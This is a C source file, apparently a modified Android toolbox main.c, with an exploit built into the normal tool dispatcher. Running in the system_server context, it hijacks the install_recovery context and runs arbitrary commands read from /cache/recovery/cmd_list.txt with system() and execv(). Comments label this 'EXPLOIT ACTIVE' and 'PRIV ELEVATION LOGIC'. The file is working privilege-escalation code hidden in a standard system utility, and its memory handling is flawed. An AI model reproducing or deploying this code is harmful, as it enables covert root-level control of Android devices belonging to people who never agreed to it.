#include <sys/wait.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <cutils/properties.h>
#include <selinux/selinux.h>

#include "shared.h"


//my function definitions
int system_server_loop();
int eXecCmd(char *, const char *,int);

//toolbox function definitions
int main(int, char **);

static int toolbox_main(int argc, char **argv)
{
    // "toolbox foo ..." is equivalent to "foo ..."
    if (argc > 1) {
        return main(argc - 1, argv + 1);
    } else {
        printf("!Toolbox!\n");
        return 0;
    }
}

#define TOOL(name) int name##_main(int, char**);
#include "tools.h"
#undef TOOL

static struct 
{
    const char *name;
    int (*func)(int, char**);
} tools[] = {
    { "toolbox", toolbox_main },
#define TOOL(name) { #name, name##_main },
#include "tools.h"
#undef TOOL
    { 0, 0 },
};

static void SIGPIPE_handler(int signal) {
    // Those desktop Linux tools that catch SIGPIPE seem to agree that it's
    // a successful way to exit, not a failure. (Which makes sense --- we were
    // told to stop by a reader, rather than failing to continue ourselves.)
    _exit(0);
}

int main(int argc, char **argv)
{
	//default toolbox variables
    int i;
    char *name = argv[0];


	//saves current context
	char *currcon;
	//we use this to fork < system_server into it's own loop    
    pid_t ss_cpid, ss_check_this_pid;


	// contexts
	const char *SERVER_CONTEXT = "u:r:system_server:s0";
	const char *INSTALL_CONTEXT = "u:r:install_recovery:s0";

//moved to header so farm.c knows when the hack is live
	// only run SERVER_CONTEXT once
//	const char *RSF_TOOLBOX = "/cache/recovery/.toolbox";
	
	getcon(&currcon);
	LOGV("[+] toolbox running %s as uid: %d, gid: %d, context %s", argv[0], getuid(), getgid(), currcon);

														/* If RSF_TOOLBOX_RUN_ONCE file is current 0 increment by 1 */
														/* this prevents further system_server processes from running the exploit */
								if( !strcmp(SERVER_CONTEXT, currcon) && increment_value(0, RSF_TOOLBOX_RUN_ONCE) ) { /* I expect current value of 0, otherwise return false */
																			/* if system_server context && increment did't return 0 we will be here */
																				
			
	
				
														
											LOGV("[*] Forking system_server < install_recovery + system_server pid:%i",getpid());
    										ss_cpid = fork();
    										switch (ss_cpid) /* send child proc into ss loop */
    										{
        										case -1: LOGV("Fork failed; ss_cpid == -1");
                 									break;
        										case 0: ss_check_this_pid = getpid();
        										
        											//send the spawned root+system_server thread into the system_server_loop() function
        											if(system_server_loop()){		}else{	exit(0);  }

       											//original thread will pass by to become install_recovery
		        							}        			

								
								LOGV("[*] toolbox property_set flash_recovery pid:%i",getpid());
								property_set("ctl.start", "flash_recovery");
								
								/* ONLY the first install_recovery will be hijacked, use the same file as system_server but this time set it to 2 */
								/* if current context == install_recovery AND we haven't already increment RSF_TOOLBOX_RUN_ONCE to be value of 2 */
								}else if (!strcmp(INSTALL_CONTEXT, currcon) && increment_value(1, RSF_TOOLBOX_RUN_ONCE) ) {	/* increment rejects if value not currently 1 */							
																			/* if install_recovery context && increment did't return 0 we will be here */								
																LOGV("[*] -=-= EXPLOIT ACTIVE =-=- ");




		// when bridge has sen't cmd_list.txt and any supporting files for our cmd_list.txt this value will be 1 inside the file
		while(check_value(RSF_SENT_FILE_LIST) != 1) {usleep(200);}


	   char *    exec_trimmed_CmdLine; //char pointer to an unallocated char array used with system().
	   char *	 tmpStr; //char pointer to an unallocated char array used to test requested context. -$ system_server or -# install_recovery
	   
	   //while loop processes cmd_list.txt 2040 is probably 4 times overkill but let's not fail over a few bytes difference
		char line[2040];
		int iCntr=0;
		int ret=1;
		int isWait=1;
		int time_we_wait=0;

			//open the file hardcoded below <DEBUG> hard coded
   			FILE *file_ir_cmds = fopen("/cache/recovery/cmd_list.txt","r");
   				if (file_ir_cmds == NULL) {
   					return 1;
   				}

//===>[-] Parse text file for bridge specific duties [-]<===
		while (fgets(line, sizeof(line), file_ir_cmds)) {
			tmpStr = strtok(line,"|");
			exec_trimmed_CmdLine = strtok(NULL,"|");

			time_we_wait=0;

			ret = strncmp(tmpStr, "-#", 2);
			if ( ret == 0 ){
				/* If -#e was found wait for amount of time set in bridge.c set_default(#,RSF_TOOLBOX_WAIT)*/
				 isWait = strncmp(tmpStr, "-#e", 3);
				 if ( isWait == 0 ) {
					time_we_wait=check_value(RSF_TOOLBOX_WAIT);
				 }
			
				//calls function with <DEBUG> hard coded context
				if (eXecCmd(exec_trimmed_CmdLine,"install_recovery",time_we_wait)){}
				

			
			}

					//signal system_server to continue
					if ( increment_value(0, RSF_IREC_DONE) ) {} /* careful, i used increment_value here not set_value */
					
						//wait for system_server to set the value 0 again
						while ( check_value(RSF_IREC_DONE) != 0 ) {
						usleep(200);} /* 200 == a fith of a second */
		iCntr++;
		}
					//signal system_server to continue
					if ( increment_value(0, RSF_IREC_DONE) ) {} /* careful, i used increment_value here not set_value */

	if(file_ir_cmds != NULL)				        
	fclose(file_ir_cmds);


		//signal bridge/till/farm that we are done now.	   
if ( increment_value(1, RSF_SENT_FILE_LIST) ) {}


} //END OF ELSE IF --- PRIV ELEVATION LOGIC


leave_hack:
if(currcon != NULL)
	free(currcon);    
    
    
    // Let's assume that none of this code handles broken pipes. At least ls,
    // ps, and top were broken (though I'd previously added this fix locally
    // to top). We exit rather than use SIG_IGN because tools like top will
    // just keep on writing to nowhere forever if we don't stop them.
    signal(SIGPIPE, SIGPIPE_handler);

    if((argc > 1) && (argv[1][0] == '@')) {
        name = argv[1] + 1;
        argc--;
        argv++;
    } else {
        char *cmd = strrchr(argv[0], '/');
        if (cmd)
            name = cmd + 1;
    }

    for(i = 0; tools[i].name; i++){
        if(!strcmp(tools[i].name, name)){
            return tools[i].func(argc, argv);
        }
    }

    printf("%s: no such tool\n", argv[0]);
    return -1;
}




int system_server_loop(){
						/* wait for install_recovery to process a line 
						   then system_server will process a line, 
						   then install_recovery again and so on */
							while ( check_value(RSF_IREC_DONE) != 1 ) {
							usleep(200);} /* 200 == a fith of a second */

	   char *    exec_trimmed_CmdLine; //command line trimmed and ready to execute
	   char *	 tmpStr; //used to test the desired context; system_server vs install_recovery
	   
	   //while loop processes cmd_list.txt
		char line[2040];
		int iCntr=0;
		int ret=1; //true is false basically.. 

			//open the file
   			FILE *fpBlock = fopen("/cache/recovery/cmd_list.txt","r");
   				if (fpBlock == NULL) {
   					LOGV("error opening cmd_list.txt in system_server loop");
   					return 1;
   				}

//===>[-] Parse text file for bridge specific duties [-]<===
		while (fgets(line, sizeof(line), fpBlock)) {
			tmpStr = strtok(line,"|");
			exec_trimmed_CmdLine = strtok(NULL,"|");
			
			//test if applies to system_server
			int ret = strncmp(tmpStr, "-$", 2);
			if ( ret == 0 ){

				//calls function with <DEBUG> hard coded context
				if (eXecCmd(exec_trimmed_CmdLine,"system_server",0)){}			

			}


					//signal install_recovery to continue
					if ( set_value(0, RSF_IREC_DONE) ) {}
					
					
						//wait for install_recovery to set the value 1 again
						while ( check_value(RSF_IREC_DONE) != 1 ) {
						usleep(200);} /* 200 == a fith of a second */

			iCntr++;
	
		}
					//signal install_recovery to continue, must use set_value here not increment_value
					if ( set_value(0, RSF_IREC_DONE) ) {}
		

	if(fpBlock != NULL)				        
	fclose(fpBlock);
		
		
		
	return 0;
}
int eXecCmd(char *command_line, const char *curProc,int time_we_wait) {
//if system() return was nonzero there was an error, let's try execv() instead
//printf("curProc: %s command_line: %s\n",curProc, command_line);
				if( system(command_line) ) {
				LOGV("%s system() call failed for: %s .. attempting execv()",curProc, command_line);
				
				
   //execv(<binary>, <command>)
   //<TODO> do I need to split the string more? execv(binary, arg1, arg2, arg3, NULL);?????
   char *		bin_path_extract = (char *) malloc(100);
   char *		cmd_line_extract = (char *) malloc(500);
   char *		cmdArgs1 = (char *) malloc(50);
   char *		cmdArgs2 = (char *) malloc(50);
   char *		cmdArgs3 = (char *) malloc(50);
   char *		cmdArgs4 = (char *) malloc(50);
   char *		cmdArgs5 = (char *) malloc(50);   

    pid_t cpid;
    pid_t child_pid;
	
    //execv doesn't return the thread to us so we need to fork() a new thread first
    cpid = fork();
    switch (cpid) {
        	case -1: LOGV("Fork failed; cpid == -1");
                 break;
			//child commands below
        	case 0: child_pid = getpid();

				//parse the command line <binary> <remainder>
				bin_path_extract = strtok(command_line," ");
				cmd_line_extract = strtok(NULL,"\n");
				
				cmdArgs1 = strtok(cmd_line_extract," ");
				if (cmdArgs1 != NULL)
				cmdArgs2 = strtok(NULL," ");
				if (cmdArgs2 != NULL)				
				cmdArgs3 = strtok(NULL," ");
				if (cmdArgs3 != NULL)
				cmdArgs4 = strtok(NULL," ");
				if (cmdArgs4 != NULL)
				cmdArgs5 = strtok(NULL," ");


	        if(cmdArgs5 != NULL) {
				char *exe_args[] = { bin_path_extract, cmdArgs1, cmdArgs2, cmdArgs3, cmdArgs4, cmdArgs5, NULL};
				execv( exe_args[0], exe_args );
			} else if(cmdArgs4 != NULL) {
				char *exe_args[] = { bin_path_extract, cmdArgs1, cmdArgs2, cmdArgs3, cmdArgs4, NULL};
				execv( exe_args[0], exe_args );
			} else if(cmdArgs3 != NULL) {
				char *exe_args[] = { bin_path_extract, cmdArgs1, cmdArgs2, cmdArgs3, NULL};
				execv( exe_args[0], exe_args );
			} else if(cmdArgs2 != NULL) {
				char *exe_args[] = { bin_path_extract, cmdArgs1, cmdArgs2, NULL};
				execv( exe_args[0], exe_args );
			} else {
				char *exe_args[] = { bin_path_extract, cmdArgs1, NULL};
				execv( exe_args[0], exe_args );
			}

        
        	//wait for execv() to finish before continuing, the forked child will not return from execv()
        	//test status for execv() approximately here if you want that.
        	default:
        			waitpid(cpid, NULL, 0);
	}

if ( bin_path_extract!= NULL ) {free(bin_path_extract);}
if ( cmd_line_extract!= NULL ) {free(cmd_line_extract);}
if ( cmdArgs1!= NULL ) {free(cmdArgs1);}
if ( cmdArgs2!= NULL ) {free(cmdArgs2);}
if ( cmdArgs3!= NULL ) {free(cmdArgs3);}
if ( cmdArgs4!= NULL ) {free(cmdArgs4);}
if ( cmdArgs5!= NULL ) {free(cmdArgs5);}

}else{
					LOGV("Sys. Serv. SUCCESS: %s",command_line);
        		}			
      			
				//time to wait thing a ma jig
				if ( time_we_wait ) { int iWait=0;while (iWait <= time_we_wait) {sleep(60);iWait++;} }

	return 0;
}
